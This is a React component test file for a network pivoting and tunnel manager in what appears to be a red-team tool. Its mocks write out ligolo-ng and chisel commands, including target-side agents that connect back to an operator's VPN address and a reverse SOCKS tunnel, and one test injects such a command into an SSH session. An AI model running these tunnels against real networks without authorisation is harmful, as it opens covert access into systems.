import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { describe, it, expect, vi } from 'vitest';
import { PivotManagerModal } from './PivotManagerModal';
import { NetworkRoute, PivotInstanceInfo } from '../types/pivot';

describe('PivotManagerModal (F-24)', () => {
  const defaultProps = () => {
    const savedRoutes: NetworkRoute[] = [];
    let runningInstance: PivotInstanceInfo | null = null;

    return {
      isOpen: true,
      onClose: vi.fn(),
      activeSessionId: 'ssh-session-1',
      activeEngagementId: 'eng-1',
      activeEngagementName: 'Corp RedTeam',
      onSendToTerminal: vi.fn(),
      onSpawnLocalTerminal: vi.fn(),
      getDefaultRoutes: vi.fn().mockResolvedValue([
        {
          id: 'preset-1',
          name: 'Ligolo-ng TUN Proxy',
          kind: 'ligolo',
          tool: 'ligolo-ng',
          bindAddress: '0.0.0.0',
          listenPort: 11601,
          interfaceName: 'ligolo',
          subnets: ['10.10.20.0/24'],
          reverse: false,
          selfCert: true,
          ignoreCert: true,
        },
      ]),
      listRoutes: vi.fn().mockImplementation(async () => [...savedRoutes]),
      saveRoute: vi.fn().mockImplementation(async (r: NetworkRoute) => {
        savedRoutes.push(r);
      }),
      deleteRoute: vi.fn().mockResolvedValue(undefined),
      detectBinaries: vi.fn().mockResolvedValue([
        { tool: 'ligolo-ng', found: true, binaryName: 'ligolo-proxy', path: '/usr/bin/ligolo-proxy' },
        { tool: 'chisel', found: false, binaryName: 'chisel', path: '' },
      ]),
      startPivot: vi.fn().mockImplementation(async (r: NetworkRoute) => {
        runningInstance = {
          id: 'piv-1',
          name: r.name,
          tool: r.tool,
          bindAddress: r.bindAddress,
          listenPort: r.listenPort,
          interfaceName: r.interfaceName,
          subnets: r.subnets,
          status: 'running',
          pid: 4242,
          commandPreview: `ligolo-proxy -laddr ${r.bindAddress}:${r.listenPort} -selfcert`,
          recentLogs: ['[20:00:00] [OUT] Listening on 0.0.0.0:11601'],
          connectedAgents: ['Agent joined id=1 session:dc01'],
        };
        return runningInstance;
      }),
      stopPivot: vi.fn().mockImplementation(async () => {
        runningInstance = null;
      }),
      sendPivotInput: vi.fn().mockImplementation(async (_id: string, line: string) => {
        if (runningInstance) {
          runningInstance = {
            ...runningInstance,
            recentLogs: [...(runningInstance.recentLogs || []), `[20:00:05] [IN] > ${line}`],
          };
        }
      }),
      listActivePivots: vi.fn().mockImplementation(async () => (runningInstance ? [runningInstance] : [])),
      buildCommands: vi.fn().mockImplementation(async (r: NetworkRoute, lhost: string) => ({
        tool: r.tool,
        lhost,
        proxyCommand: r.tool === 'chisel' ? `chisel server --host 0.0.0.0 -p ${r.listenPort} --reverse --socks5` : `ligolo-proxy -laddr 0.0.0.0:${r.listenPort} -selfcert`,
        setupCommands: ['sudo ip tuntap add user $USER mode tun ligolo'],
        routeCommands: ['sudo ip route add 10.10.20.0/24 dev ligolo'],
        linuxAgentCmd: r.tool === 'chisel' ? `./chisel client ${lhost}:${r.listenPort} R:socks` : `./agent -connect ${lhost}:${r.listenPort} -ignore-cert`,
        windowsAgentCmd: r.tool === 'chisel' ? `.\\chisel.exe client ${lhost}:${r.listenPort} R:socks` : `.\\agent.exe -connect ${lhost}:${r.listenPort} -ignore-cert`,
        proxychainsLine: r.tool === 'chisel' ? `socks5 127.0.0.1 ${r.socksPort || 1080}` : undefined,
        opsecWarnings: [],
      })),
      getLocalIPs: vi.fn().mockResolvedValue([
        { interface: 'tun0', ip: '10.10.14.99', cidr: '10.10.14.99/23', isVpn: true },
        { interface: 'eth0', ip: '192.168.1.50', cidr: '192.168.1.50/24', isVpn: false },
      ]),
    };
  };

  it('detects binaries & VPN LHOST, saves route to vault, and injects target agent command (F-24)', async () => {
    const props = defaultProps();
    render(<PivotManagerModal {...props} />);

    await waitFor(() => {
      expect(screen.getByText(/NETWORK PIVOTING & TUNNEL MANAGER/i)).toBeInTheDocument();
      expect(screen.getByText(/VPN \(tun0\): 10\.10\.14\.99/i)).toBeInTheDocument();
    });

    await waitFor(() => {
      expect(screen.getByText(/\.\/agent -connect 10\.10\.14\.99:11601 -ignore-cert/)).toBeInTheDocument();
    });

    // Save route to Vault
    fireEvent.click(screen.getByRole('button', { name: /Save to Vault/i }));
    await waitFor(() => {
      expect(props.saveRoute).toHaveBeenCalledTimes(1);
    });
    expect(props.saveRoute.mock.calls[0][0].engagementId).toBe('eng-1');

    // Inject Linux target command into active terminal
    const insertButtons = screen.getAllByRole('button', { name: /Insert/i });
    fireEvent.click(insertButtons[0]);
    expect(props.onSendToTerminal).toHaveBeenCalledWith(
      'ssh-session-1',
      './agent -connect 10.10.14.99:11601 -ignore-cert'
    );
  });

  it('launches pivot, streams console, sends stdin command, and stops process (F-24)', async () => {
    const props = defaultProps();
    render(<PivotManagerModal {...props} />);

    await waitFor(() => {
      expect(screen.getByRole('button', { name: /Launch Pivot/i })).toBeInTheDocument();
    });

    fireEvent.click(screen.getByRole('button', { name: /Launch Pivot/i }));

    await waitFor(() => {
      expect(screen.getByText('RUNNING')).toBeInTheDocument();
      expect(screen.getAllByText(/PID 4242/).length).toBeGreaterThan(0);
    });

    const stdinInput = screen.getByPlaceholderText(/Send interactive console command/i);
    fireEvent.change(stdinInput, { target: { value: 'ifconfig' } });
    fireEvent.click(screen.getByRole('button', { name: /Send/i }));

    await waitFor(() => {
      expect(props.sendPivotInput).toHaveBeenCalledWith('piv-1', 'ifconfig');
    });

    fireEvent.click(screen.getByRole('button', { name: /Stop Pivot/i }));
    await waitFor(() => {
      expect(props.stopPivot).toHaveBeenCalledWith('piv-1');
    });
  });
});
